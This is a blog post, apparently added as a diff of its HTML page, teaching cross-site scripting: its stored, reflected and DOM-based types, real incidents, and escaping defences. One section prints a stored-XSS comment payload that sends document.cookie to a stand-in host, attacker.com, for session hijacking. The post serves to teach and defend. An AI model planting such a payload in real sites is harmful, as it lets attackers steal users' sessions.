@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en-US">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="author" content="Martin Thoma" />
+        <meta name="copyright" content="Martin Thoma" />
+        <link title = "Martin Thoma"
+              type  = "application/opensearchdescription+xml"
+              rel   = "search"
+              href  = "../opensearch.xml">
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="InfoSec, AppSec, Security, Cybersecurity, XSS, Code, " />
+
+<meta property="og:title" content="Cross-site Scripting (XSS) 😈 "/>
+<meta property="og:url" content="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f" />
+<meta property="og:description" content="Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users’ machine. Various types of XSS are distinguished: Stored XSS: The attacker can make the website store the XSS …" />
+<meta property="og:site_name" content="Martin Thoma" />
+<meta property="og:article:author" content="Martin Thoma" />
+<meta property="og:article:published_time" content="2020-10-16T20:00:00+02:00" />
+<meta name="twitter:title" content="Cross-site Scripting (XSS) 😈 ">
+<meta name="twitter:description" content="Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users’ machine. Various types of XSS are distinguished: Stored XSS: The attacker can make the website store the XSS …">
+<meta property="og:image" content="logos/cybersecurity.png" />
+<meta name="twitter:image" content="logos/cybersecurity.png" >
+
+        <title>Cross-site Scripting (XSS) 😈  · Martin Thoma
+</title>
+        <!-- Latest compiled and minified CSS -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="../theme/css/pygments.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../theme/tipuesearch/tipuesearch.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../theme/css/elegant.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../static/print.css" media="print">
+        <link rel="stylesheet" type="text/css" href="../static/custom.css" media="screen">
+
+        <!-- MathJax -->
+<script type="text/x-mathjax-config">
+<!--
+MathJax.Hub.Config({
+  jax: ["input/TeX", "output/HTML-CSS"],
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [ ['$$', '$$'], ['\\[','\\]']],
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+    processEscapes: true
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+// -->
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+        <link href="https://martin-thoma.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Martin Thoma - Full Atom Feed" />
+        <link href="https://martin-thoma.com/feeds/index.xml" type="application/rss+xml" rel="alternate" title="Martin Thoma - Full RSS Feed" />
+    </head>
+    <body>
+        <div id="content-sans-footer">
+        <div class="navbar navbar-static-top navbar-default">
+            <div class="container">
+                <div class="container-fluid">
+                    <div class="collapse navbar-collapse">
+                        <ul class="nav pull-left top-menu navbar-nav">
+                            <li><a href=".." style="font-family: 'Monaco', 'Inconsolata', 'Andale Mono', 'Lucida Console', 'Bitstream Vera Sans Mono', 'Courier New', Courier, Monospace;
+                        font-size: 20px;" class="navbar-brand" tabindex="-1">Martin Thoma</a>
+                            </li>
+                        </ul>
+                        <ul class="nav pull-right top-menu navbar-nav">
+                            <li ><a href="..">Home</a></li>
+                            <li ><a href="../categories.html">Categories</a></li>
+                            <li ><a href="../tags.html">Tags</a></li>
+                            <li ><a href="../archives.html">Archives</a></li>
+                            <li><a href="../support-me/">Support me</a></li>
+                            <li><form class="navbar-form" action="../search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="search" class="search-query form-control" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-1 col-md-1"></div>
+                <div class="col-sm-10 col-md-10">
+<article>
+<div class="row">
+    <header class="page-header col-sm-10 col-md-10 col-md-offset-2">
+    <h1><a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"> Cross-site Scripting (XSS) 😈  </a></h1>
+    </header>
+</div>
+
+<div class="row">
+    <div class="col-sm-2 col-md-2 table-of-content">
+        <nav>
+        <h4>Contents</h4>
+        <div id="toc"><ul><li><a class="toc-href" href="#why-it-matters" title="Why it Matters">Why it Matters</a></li><li><a class="toc-href" href="#how-are-xss-attacks-executed" title="How are XSS attacks executed?">How are XSS attacks executed?</a></li><li><a class="toc-href" href="#what-can-i-do-to-prevent-xss-attacks" title="What can I do to prevent XSS attacks?">What can I do to prevent XSS attacks?</a></li><li><a class="toc-href" href="#see-also" title="See also">See also</a></li><li><a class="toc-href" href="#whats-next" title="What&rsquo;s next?">What&rsquo;s next?</a></li></ul></div>
+        </nav>
+    </div>
+    <div class="col-sm-8 col-md-8 article-content" id="contentAfterTitle">
+
+            
+            <p>Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&rsquo; machine.</p>
+<p>Various types of XSS are distinguished:</p>
+<ul>
+<li><strong>Stored XSS</strong>: The attacker can make the website store the XSS, e.g. by crafting a comment on Facebook or a chat message on Twitch which contains the malicious message. The malicious message is then delivered to every new client which accesses the page.</li>
+<li><strong>Reflected XSS</strong>: Some websites allow you to create links that you can share. For example, a Google search. The URL contains the search term and if somebody clicks on that link, Google will show the search term from the link on the page. So Google reflects a parameter of the link on the page. If an attacker changes the search term to contain code, that code could potentially be executed by the browser of any user who clicks on the link.</li>
+<li><strong>DOM-based XSS</strong>: In modern web applications the logic is mostly in the client. This means the attacker does not have to go to the server-side to do harm. The on-site JavaScript is attacked. In contrast to the reflected XSS, the server didn&rsquo;t directly cause the issue. The (valid) JavaScript on the page read the attack.</li>
+</ul>
+<p>The <strong>attack surface</strong> is pretty big for modern websites. Any user-supplied
+data can contain an XSS attack. It could be a comments section, advertisement,
+the document.referrer, URL fragments, &hellip;</p>
+<h2 id="why-it-matters">Why it Matters</h2>
+<ul>
+<li>XSS is part of the <a href="https://owasp.org/www-project-top-ten/">OWASP Top-10</a>, meaning it&rsquo;s recognized as a common vulnerability</li>
+<li>There are <strong>14,625 CVE entries for XSS</strong> vulnerabilities on mitre.org (<a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site">source</a>)</li>
+<li><strong>2005</strong>: MySpace had a worm called <a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)">Samy</a>. Within 20 hours, the author got one million users to friend him (<a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever">source</a>). <strong>MySpace had to take the site down because of this XSS attack.</strong></li>
+<li><strong>2011</strong>: Facebook worm allows automatic wall posts (<a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">source</a>)</li>
+<li><strong>2013</strong>: PayPal was vulnerable as discovered by <a href="https://s3cur3.it/references">Robert Kugler</a> (<a href="https://seclists.org/fulldisclosure/2013/May/163">source</a>). It was likely possible to create a link which made a payment when you clicked on it, without you needing to interact.</li>
+<li><strong>2013</strong>: Yahoo was vulnerable to reflected XSS (<a href="https://arstechnica.com/information-technology/2013/01/how-yahoo-allowed-hackers-to-hijack-my-neighbors-e-mail-account/">source</a>)</li>
+<li><strong>2016</strong>: Researcher found XSS vulnerability on Facebook (<a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/">source</a>)</li>
+<li><strong>2018</strong>: Uber was vulnerable to a reflected XSS attack (<a href="https://hackerone.com/reports/191810">source</a>). Uber paid $3000 for it.</li>
+<li><strong>2019</strong>: Steam was vulnerable to a stored XSS attack (<a href="https://hackerone.com/reports/409850">source</a>). Steam paid $7500 for it.</li>
+<li><strong>2020</strong>: Facebook paid <strong>$20,000</strong> for finding an XSS attack (<a href="https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty">source</a>).</li>
+<li><strong>2020</strong>: Tumblr was vulnerable to a DOM-based XSS attack (<a href="https://hackerone.com/reports/882546">source</a>). Automattic paid $350 for it.</li>
+</ul>
+<p><img alt="Photo by Aar&oacute;n Blanco Tejedor on Unsplash" src="https://cdn-images-1.medium.com/max/9856/0*ExwQ55rXgbShCgmN"/><em>Photo by <a href="https://unsplash.com/@healing_photographer?utm_source=medium&amp;utm_medium=referral">Aar&oacute;n Blanco Tejedor</a> on <a href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral">Unsplash</a></em></p>
+<h2 id="how-are-xss-attacks-executed">How are XSS attacks executed?</h2>
+<p>There are various ways attackers can do harm: They can <strong>make the website
+unusable</strong> if the XSS script is on it. They can run a <strong>cryptocurrency miner</strong>.
+They can <strong>steal sensitive data</strong>.</p>
+<p>As promised, it follows how to design a <strong>cookie stealer</strong> for <strong>account
+hijacking</strong>.</p>
+<p>We just assume that we have a website like Facebook where you can add comments
+to posts. We assume that the comments are just taken as is and copied to
+everybody who opens the page. The comment we make is</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nx">image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+    <span class="nx">image</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">'[https://attacker.com/steal?cookie='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">](</span><span class="nx">https</span><span class="o">:</span><span class="c1">//attacker.com/?'+document.cookie);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>You can see that this will not do anything &mdash; for the other users, this will
+just look like an empty message. It will not refresh the page. It will not open
+another window. But it will call http://attacker.com/steal with a GET request
+which has a cookie parameter. Hence on the side of the attacker there only
+needs to be a web server that is reachable and logs those requests. After that,
+the attacker can use the cookie and impersonate the victim. The attacker
+doesn&rsquo;t know the victims' credentials but hijacked the session instead.</p>
+<h2 id="what-can-i-do-to-prevent-xss-attacks">What can I do to prevent XSS attacks?</h2>
+<p>Never blindly trust user data. Remove potentially harmful parts, escape parts
+that will change the expected output. You might want to remove and <code>&lt;script&gt;</code>
+tags or replace <code>&lt;</code> by <code>&amp;lt;</code>. It&rsquo;s not enough, though. You can also execute
+JavaScript with the
+<a href="https://www.w3schools.com/jsref/event_onload.asp">onload attribute</a>. That
+attribute can be added to many or even all HTML tags.</p>
+<p>Various languages have methods to escape those:</p>
+<ul>
+<li>Go: <a href="https://golang.org/pkg/html/#EscapeString">EscapeString</a></li>
+<li>Java: <a href="https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringEscapeUtils.html#escapeHtml(java.lang.String)">org.apache.commons.lang.StringEscapeUtils.escapeHtml</a></li>
+<li>JavaScript: <a href="https://www.npmjs.com/package/dompurify">DOMPurify</a></li>
+<li>Python: <a href="https://docs.python.org/3/library/html.html#html.escape">html.escape</a></li>
+<li>PHP: <a href="https://www.php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars</a></li>
+<li>Ruby: <a href="https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB/Util.html#method-c-html_escape">htmlescape</a></li>
+<li>Rust: <a href="https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html">htmlescape::encode_miniaml</a></li>
+</ul>
+<p>Also, make sure you do that as early as possible. There should be a secure way
+to use data from the database &mdash; and that should not require to know that there
+is potentially harmful data within it. So escape the data before you put it in
+the DB. Make sure escaping is
+<a href="https://en.wikipedia.org/wiki/Idempotence">idempotent</a> &mdash; escaping two times
+should be the same as escaping once. If you really think you need the original
+somewhere, you can have a _raw field in the database. Or you have a data access
+layer (DAL) that takes care of the escaping.</p>
+<p>Remember to <strong>sanitize ALL user inputs</strong>, not only stuff that was in input fields. Don&rsquo;t forget about <a href="https://martin-thoma.com/tags.html#klausur-ref">URL fragments</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer">Document.referrer</a> .</p>
+<h2 id="see-also">See also</h2>
+<p>I love <a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)">Tom Scott</a> and <a href="https://www.youtube.com/user/Computerphile">Computerphile</a> and they made a video about the topic!</p>
+<p><center><iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/L5l9lSnNMxg" width="560"></iframe></center></p>
+<h2 id="whats-next">What&rsquo;s next?</h2>
+<p>In this series about application security (AppSec) we already had:</p>
+<ul>
+<li>Part 1: <a href="https://medium.com/faun/sql-injections-e8bc9a14c95">SQL Injections 😈</a></li>
+<li>Part 2: <a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80">Leaking Secrets 😇</a></li>
+<li>Part 3: <a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f">Cross-site Scripting (XSS) 😈</a></li>
+</ul>
+<p>And this is about to come:</p>
+<ul>
+<li>CSRF</li>
+<li>DOS</li>
+<li>Password Hashing</li>
+<li>ZIP Bombs</li>
+<li>Credential Stuffing</li>
+<li>Cryptojacking</li>
+</ul>
+<p>Let me know if you are interested in more articles! (info@martin-thoma.de)</p>
+            
+            <div id="disqus_thread" class="no-print"></div>
+<script>
+    /*
+    var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+        var d = document, s = d.createElement('script');
+
+        s.src = '//martinthoma.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+            <hr/>
+        </div>
+        <section>
+        <div class="col-sm-2 col-md-2" style="float:right;font-size:0.9em;">
+            <h4>Published</h4>
+            <time pubdate="pubdate" datetime="2020-10-16T20:00:00+02:00">Okt 16, 2020</time>
+            <br/>
+            by <a rel="author" class="vcard author post-author" itemprop="author" href="../author/martin-thoma/"><span class="fn" itemscope="" itemtype="https://schema.org/Person"><span itemprop="name">Martin Thoma</span></span></a>
+            <h4>Category</h4>
+            <a class="category-link" href="../categories.html#code-ref">Code</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="../tags.html#appsec-ref">AppSec
+                    <span>5</span>
+</a></li>
+                <li><a href="../tags.html#cybersecurity-ref">Cybersecurity
+                    <span>4</span>
+</a></li>
+                <li><a href="../tags.html#infosec-ref">InfoSec
+                    <span>4</span>
+</a></li>
+                <li><a href="../tags.html#security-ref">Security
+                    <span>7</span>
+</a></li>
+                <li><a href="../tags.html#xss-ref">XSS
+                    <span>1</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+    <a href="https://twitter.com/themoosemind" title="My Twitter Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-twitter sidebar-social-links"></i></a>
+    <a href="mailto:info@martin-thoma.de" title="My Email Address" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-envelope sidebar-social-links"></i></a>
+    <a href="https://github.com/MartinThoma" title="My Github Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-github sidebar-social-links"></i></a>
+    <a href="http://stackoverflow.com/users/562769/martin-thoma" title="My Stackoverflow Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-stackoverflow sidebar-social-links"></i></a>
+        </div>
+        </section>
+</div>
+</article>
+                </div>
+                <div class="col-sm-1 col-md-1"></div>
+            </div>
+        </div>
+        <div id="push"></div>
+    </div>
+<footer class="no-print">
+<div id="footer">
+    <ul class="footer-content">
+        <li class="elegant-subtitle"><span class="site-name">Martin Thoma</span> - A blog about Code, the Web and Cyberculture</li>
+        <li><a href="https://martin-thoma.com/feeds/index.xml">RSS-Feed</a></li>
+        <li><a href="http://www.martin-thoma.de/privacy.htm">Datenschutzerkl&auml;rung</a></li>
+        <li><a href="http://www.martin-thoma.de/impressum.htm">Impressum</a></li>
+        <li class="elegant-power">Powered by <a href="http://getpelican.com/" title="Pelican Home Page" tabindex="-1">Pelican</a>. Theme: <a href="http://oncrashreboot.com/pelican-elegant" title="Theme Elegant Home Page" tabindex="-1">Elegant</a> by <a href="http://oncrashreboot.com" title="Talha Mansoor Home Page" tabindex="-1">Talha Mansoor</a></li>
+    </ul>
+</div>
+</footer>        <script src="//code.jquery.com/jquery.min.js"></script>
+        <!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+        <script>
+(function(){
+    'use strict';
+
+    /*
+    Create intra-page links
+    Requires that your headings already have an `id` attribute set
+    For every heading in your page, this adds a little anchor link `#` that you can click to get a permalink to the heading.
+    Ignores `h1`, because you should only have one per page.
+    The text content of the tag is used to generate the link, so it will fail "gracefully-ish" if you have duplicate heading text.
+
+    Credit: https://gist.github.com/SimplGy/a229d25cdb19d7f21231
+     */
+
+    var headingNodes = [], results, link,
+        tags = ['h2', 'h3', 'h4', 'h5', 'h6'];
+
+    tags.forEach(function(tag){
+        var contentTag = document.getElementById('contentAfterTitle');
+      results = contentTag.getElementsByTagName(tag);
+      Array.prototype.push.apply(headingNodes, results);
+    });
+
+    headingNodes.forEach(function(node){
+      link = document.createElement('a');
+      link.className = 'deepLink';
+      link.textContent = ' ¶';
+      link.href = '#' + node.getAttribute('id');
+      node.appendChild(link);
+    });
+
+  })();
+</script>
+    </body>
+    <!-- Theme: Elegant built for Pelican
+    License : http://oncrashreboot.com/pelican-elegant -->
+</html>
